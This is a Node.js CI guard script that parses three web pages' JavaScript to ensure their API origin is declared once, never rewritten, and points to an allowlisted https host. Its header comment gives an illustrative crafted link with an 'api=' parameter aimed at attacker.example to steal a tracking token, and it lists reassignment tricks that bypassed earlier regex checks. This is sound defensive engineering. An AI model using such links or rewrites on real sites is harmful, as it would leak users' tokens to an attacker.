#!/usr/bin/env node
/**
 * Guard: the site's API origin is declared once, never rewritten, and expected.
 *
 * Why three copies exist
 * ----------------------
 * invite/invite.js, invite/redeem.js and track/track.js each declare their own
 * `API_BASE`. They are deliberately not collapsed into a shared
 * `window.SERAYAE_API_BASE` — but not for a security reason. An earlier version
 * of this comment claimed a page global would be an exfiltration risk, and
 * review was right to reject that: any script able to execute on /invite or
 * /track already owns the page. It can replace `window.fetch`, read the OTP
 * field, or read the bearer token out of the verify-otp response. Hiding a
 * string in a closure buys nothing against XSS.
 *
 * The `?api=` override deleted in #7 was a different threat in kind. It was
 * attacker-controllable through a *link*, with no script execution at all: send
 * a guardian `/track/?t=<token>&api=https://attacker.example` and the tracking
 * token leaves in the request path. That is why the origin must never again be
 * writable after its declaration — which is what rule 2 enforces, and the real
 * reason this script exists.
 *
 * The literals stay for plain engineering reasons: a shared config.js adds a
 * script-order failure mode on pages where a missing base means a guardian
 * watching an emergency sees nothing, in exchange for deduplicating three
 * strings on a static site.
 *
 * Why this uses a real parser
 * ---------------------------
 * Three earlier versions tried to do this with regular expressions over text,
 * and independent review broke every one of them with a FAIL-OPEN bypass —
 * meaning the check passed while the page actually fetched from an attacker
 * host, proven by executing the file:
 *
 *   v1  matched only declarations, so a plain reassignment
 *       `API_BASE = 'https://attacker.example/api'` passed.
 *   v2  blanked whole lines that began with a comment, so
 *       `/* note *\/ API_BASE = '<attacker>';` passed.
 *   v3  used a hand-written scanner whose regex-vs-division heuristic read the
 *       `/` in `x++ / 2` as opening a regex literal, ran it to the `//` of the
 *       next `https://`, and blanked the live assignment in between. Its own
 *       docstring claimed a wrong guess could only fail closed. That was false.
 *
 * Every one of those was a lexing bug, not a rule bug. Lexing JavaScript with
 * regular expressions cannot be made sound, so this now parses the file and
 * inspects the syntax tree. `acorn` is pinned in package.json and is the only
 * dependency; it has none of its own.
 *
 * What it enforces, per file
 * --------------------------
 *  1. Exactly one `var API_BASE = <string literal>` declaration, and its
 *     initialiser is a plain string — not a template, not a concatenation, not
 *     a function call.
 *  2. Zero further writes of any kind: assignment (`=`, `+=`, `||=`, `??=`, …),
 *     destructuring (`({API_BASE} = cfg)`, `[[API_BASE]] = arr`, however
 *     nested), `for (API_BASE of …)` / `for (API_BASE in …)`, and `++`/`--`.
 *  3. No read of a URL parameter named `api`, and no `readApiOverride`.
 *
 * Across files
 * ------------
 *  4. All three origins are byte-identical.
 *  5. The host is on a positive allowlist. A blocklist of dead hosts cannot
 *     catch a mistyped redeploy of an unmemorable Heroku suffix.
 *  6. https, no port, path exactly `/api` (compared with no normalisation, so
 *     `/api/` fails — it would build `//referrals/redeem` and 404 everything),
 *     no query, no fragment.
 *
 * Usage
 *   npm ci && node .github/scripts/check-api-origin.js
 *   node .github/scripts/check-api-origin.js --print   # origin on stdout, alone
 */

'use strict';

const fs = require('fs');
const path = require('path');

let acorn;
try {
  acorn = require('acorn');
} catch {
  console.error(
    '✗ cannot load `acorn`.\n\n' +
      '  This check parses JavaScript rather than pattern-matching it, because three\n' +
      '  regex-based versions were each defeated by a fail-open lexing bug.\n\n' +
      '  Run `npm ci` first.\n',
  );
  process.exit(2);
}

const REPO_ROOT = path.resolve(__dirname, '..', '..');

const VAR_NAME = 'API_BASE';

const TARGETS = ['invite/invite.js', 'invite/redeem.js', 'track/track.js'];

/**
 * The only hosts this site may talk to.
 *
 * Add `api.serayae.me` here in the SAME commit that repoints the three files.
 * Do not add a staging host — use a local build, which is the rule #7 set.
 */
const ALLOWED_HOSTS = [
  'serayae-api-01118af29270.herokuapp.com', // Heroku app `serayae-api`, EU region
  'api.serayae.me', // reserved for the custom-domain cutover
];

const errors = [];
const found = [];

/** Depth-first walk over every node in an ESTree tree. */
function walk(node, visit) {
  if (!node || typeof node !== 'object') return;
  if (Array.isArray(node)) {
    for (const child of node) walk(child, visit);
    return;
  }
  if (typeof node.type === 'string') visit(node);
  for (const key of Object.keys(node)) {
    if (key === 'type' || key === 'start' || key === 'end' || key === 'loc' || key === 'range') {
      continue;
    }
    walk(node[key], visit);
  }
}

/** Does an assignment/binding target write to VAR_NAME, at any nesting depth? */
function targetsVar(node) {
  let hit = false;
  walk(node, (n) => {
    // A property KEY named API_BASE is not a write: `{ API_BASE: x }`.
    // `walk` visits keys too, so check the identifier's role via its parents by
    // excluding the shorthand-key case below instead of here.
    if (n.type === 'Identifier' && n.name === VAR_NAME) hit = true;
  });
  return hit;
}

/**
 * For an ObjectPattern, a non-shorthand property's KEY is not a binding.
 * `({ API_BASE: other } = cfg)` writes `other`, not API_BASE.
 * Strip those keys so they are not mistaken for writes.
 */
function bindingOnly(pattern) {
  const clone = JSON.parse(JSON.stringify(pattern));
  walk(clone, (n) => {
    if (n.type === 'Property' && !n.shorthand && n.key) {
      n.key = { type: 'Identifier', name: '__key__' };
    }
  });
  return clone;
}

const line = (node) => (node.loc ? node.loc.start.line : '?');

for (const file of TARGETS) {
  const abs = path.join(REPO_ROOT, file);

  if (!fs.existsSync(abs)) {
    errors.push(`${file}: file is missing — the guard cannot verify an origin that is not there.`);
    continue;
  }

  const src = fs.readFileSync(abs, 'utf8');

  let ast;
  try {
    ast = acorn.parse(src, { ecmaVersion: 2022, sourceType: 'script', locations: true });
  } catch (e) {
    errors.push(`${file}: does not parse — ${e.message}`);
    continue;
  }

  const declarations = [];
  const writes = [];
  const paramReads = [];

  walk(ast, (node) => {
    // ── rule 1: declarations ──────────────────────────────────────────────
    if (node.type === 'VariableDeclarator' && node.id?.type === 'Identifier' && node.id.name === VAR_NAME) {
      declarations.push(node);
      return;
    }

    // ── rule 2: every form of subsequent write ────────────────────────────
    if (node.type === 'AssignmentExpression') {
      if (node.left.type === 'Identifier' && node.left.name === VAR_NAME) {
        writes.push({ node, how: `assignment (\`${node.operator}\`)` });
      } else if (
        (node.left.type === 'ObjectPattern' || node.left.type === 'ArrayPattern') &&
        targetsVar(bindingOnly(node.left))
      ) {
        writes.push({ node, how: 'destructuring assignment' });
      }
      return;
    }

    if (node.type === 'UpdateExpression' && node.argument?.type === 'Identifier' && node.argument.name === VAR_NAME) {
      writes.push({ node, how: `update (\`${node.operator}\`)` });
      return;
    }

    if (node.type === 'ForOfStatement' || node.type === 'ForInStatement') {
      const left = node.left.type === 'VariableDeclaration' ? node.left.declarations : node.left;
      if (targetsVar(bindingOnly(left))) {
        writes.push({ node, how: `${node.type === 'ForOfStatement' ? 'for-of' : 'for-in'} rebinding` });
      }
      return;
    }

    // A second `var API_BASE` inside a nested function shadows rather than
    // writes, but it is still confusing enough to reject; the declaration
    // count in rule 1 covers it.

    // ── rule 3: reading a URL parameter named `api` ───────────────────────
    if (
      node.type === 'CallExpression' &&
      node.callee?.type === 'MemberExpression' &&
      node.callee.property?.type === 'Identifier' &&
      ['get', 'getAll'].includes(node.callee.property.name) &&
      node.arguments.length > 0 &&
      node.arguments[0].type === 'Literal' &&
      node.arguments[0].value === 'api'
    ) {
      paramReads.push(node);
      return;
    }

    if (node.type === 'Identifier' && node.name === 'readApiOverride') {
      paramReads.push(node);
    }
  });

  // ── report rule 1 ────────────────────────────────────────────────────────
  if (declarations.length === 0) {
    errors.push(
      `${file}: no \`${VAR_NAME}\` declaration in the parsed syntax tree. A declaration ` +
        `inside a comment does not count — the page would throw a ReferenceError under ` +
        `'use strict'.`,
    );
    continue;
  }
  if (declarations.length > 1) {
    errors.push(
      `${file}: ${declarations.length} declarations of \`${VAR_NAME}\` ` +
        `(lines ${declarations.map(line).join(', ')}). Exactly one is required — with two, ` +
        `the value this check validates need not be the value the page uses.`,
    );
    continue;
  }

  const init = declarations[0].init;
  if (!init || init.type !== 'Literal' || typeof init.value !== 'string') {
    errors.push(
      `${file}:${line(declarations[0])}: \`${VAR_NAME}\` must be initialised with a plain ` +
        `string literal, got ${init ? init.type : 'no initialiser'}. A template, a ` +
        `concatenation or a call would let the origin be computed at runtime, which is ` +
        `exactly what must not be possible.`,
    );
    continue;
  }

  // ── report rule 2 ────────────────────────────────────────────────────────
  if (writes.length > 0) {
    errors.push(
      `${file}: \`${VAR_NAME}\` is written again after its declaration:\n` +
        writes.map((w) => `      line ${line(w.node)} — ${w.how}`).join('\n') +
        `\n    The #7 bug was a reassignment: \`if (override) apiBase = override;\`. The ` +
        `origin must be written once and never again, or a crafted link can repoint it ` +
        `and carry a guardian's tracking token away.`,
    );
  }

  // ── report rule 3 ────────────────────────────────────────────────────────
  for (const node of paramReads) {
    errors.push(
      `${file}:${line(node)}: reads a URL parameter named \`api\`, or references ` +
        `\`readApiOverride\`. That is the #7 override, which let a crafted link repoint ` +
        `the origin with no script execution at all.`,
    );
  }

  found.push({ file, value: init.value, declLine: line(declarations[0]) });
}

// ── rules 5 and 6: the value itself ────────────────────────────────────────
for (const { file, value, declLine } of found) {
  let url;
  try {
    url = new URL(value);
  } catch {
    errors.push(`${file}:${declLine}: '${value}' is not a parsable absolute URL.`);
    continue;
  }

  if (url.protocol !== 'https:') {
    errors.push(
      `${file}:${declLine}: scheme is '${url.protocol}' — must be https. These pages ` +
        `carry bearer and tracking tokens.`,
    );
  }

  if (!ALLOWED_HOSTS.includes(url.hostname)) {
    errors.push(
      `${file}:${declLine}: host '${url.hostname}' is not allowed.\n` +
        `      Permitted: ${ALLOWED_HOSTS.join(', ')}\n` +
        `    An allowlist is used deliberately: the live host carries an unmemorable random ` +
        `suffix, and one mistyped character would otherwise pass every other rule while ` +
        `breaking every invite and tracking link on the site.`,
    );
  }

  if (url.port !== '') {
    errors.push(`${file}:${declLine}: origin must not specify a port (got ':${url.port}').`);
  }

  // No normalisation on purpose: '/api/' would build '/api//referrals/redeem'.
  if (url.pathname !== '/api') {
    errors.push(
      `${file}:${declLine}: path is '${url.pathname}' — must be exactly '/api' with no ` +
        `trailing slash, because every call site appends a route like '/referrals/redeem'.`,
    );
  }

  if (url.search !== '' || url.hash !== '') {
    errors.push(`${file}:${declLine}: origin must carry no query string or fragment.`);
  }
}

// ── rule 4: the three agree ────────────────────────────────────────────────
if (found.length === TARGETS.length) {
  const distinct = [...new Set(found.map((f) => f.value))];
  if (distinct.length > 1) {
    errors.push(
      'the origins disagree:\n' +
        found.map((f) => `      ${f.file.padEnd(18)} ${f.value}`).join('\n') +
        '\n    All must be byte-identical. An invite is minted against one page and redeemed ' +
        'on another; pointing them at different backends makes an invite silently impossible ' +
        'to accept.',
    );
  }
}

// ── report ─────────────────────────────────────────────────────────────────
if (errors.length > 0) {
  console.error('✗ API origin check failed:\n');
  for (const e of errors) console.error(`  • ${e}\n`);
  process.exit(1);
}

const origin = found[0].value;
console.error(`✓ API origin check passed — all ${found.length} files agree on ${origin}`);

if (process.argv.includes('--print')) {
  process.stdout.write(`${origin}\n`);
}
